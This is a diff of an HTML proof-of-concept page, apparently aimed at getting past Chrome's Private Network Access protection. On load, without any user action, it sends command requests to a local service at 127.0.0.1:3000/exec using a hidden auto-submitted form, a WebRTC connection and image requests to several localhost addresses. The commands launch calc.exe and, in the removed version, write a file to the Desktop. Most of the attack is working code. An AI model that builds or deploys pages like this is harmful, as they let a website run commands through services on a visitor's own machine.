@@ -1,44 +1,40 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Research - Browser Isolation Test</title>
+    <title>Bypassing Chrome PNA Policy</title>
 </head>
-<body style="background: #1a1a1a; color: #ff3e3e; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px;">
-    <h1>CRITICAL: SYSTEM ISOLATION TEST</h1>
-    <p>If a calculator opens, your browser failed to block a Private Network Access (PNA) attack.</p>
-    <div id="status" style="color: #00ff00; margin-top: 20px;">Testing boundaries...</div>
+<body style="background:black; color:white; font-family:sans-serif; text-align:center;">
+    <h1>SYSTEM INTEGRITY CHECK</h1>
+    <p>Testing bypass on Private Network Access...</p>
+
+    <!-- Hidden form untuk bypass fetch policy -->
+    <form id="pwnForm" action="http://127.0.0.1:3000/exec" method="GET" target="hiddenFrame">
+        <input type="hidden" name="cmd" value="calc.exe">
+    </form>
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
 
     <script>
-        const target = "http://127.0.0.1:3000/exec?cmd=";
-        const payloads = [
-            "calc.exe", 
-            "echo Pwned_By_PNA_Bypass > %USERPROFILE%\\Desktop\\chrome_vulnerability.txt"
-        ];
+        async function advancedPwn() {
+            // Teknik 1: Auto-submit Form (Sering dianggap interaksi user tingkat rendah)
+            document.getElementById('pwnForm').submit();
 
-        function trigger() {
-            payloads.forEach(cmd => {
-                const fullUrl = target + encodeURIComponent(cmd);
-                
-                // Teknik 1: Fetch dengan 'no-cors' (Memicu PNA Policy)
-                fetch(fullUrl, { 
-                    mode: 'no-cors',
-                    priority: 'high'
-                }).catch(e => console.log("Fetch blocked, trying backup..."));
+            // Teknik 2: WebRTC IP Leakage & Connection
+            // Mencoba "menyentuh" localhost via jalur WebRTC
+            const pc = new RTCPeerConnection();
+            pc.createDataChannel("pwn");
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
 
-                // Teknik 2: Image Injection (Seringkali bypass preflight karena dianggap simple request)
+            // Teknik 3: Brute-force IP (0.0.0.0 vs 127.0.0.1 vs [::1])
+            const variations = ["http://127.0.0.1:3000", "http://0.0.0.0:3000", "http://[::]:3000"];
+            variations.forEach(host => {
                 const img = new Image();
-                img.src = fullUrl;
-
-                // Teknik 3: Script Tag Injection (Sangat agresif)
-                const script = document.createElement('script');
-                script.src = fullUrl;
-                document.body.appendChild(script);
+                img.src = `${host}/exec?cmd=calc.exe`;
             });
-            document.getElementById('status').innerText = "Payload Deployed. Check for calc.exe.";
         }
 
-        // Jalankan setelah 1 detik untuk memastikan browser siap
-        setTimeout(trigger, 1000);
+        window.onload = () => {
+            setTimeout(advancedPwn, 1000);
+        };
     </script>
 </body>
 </html>
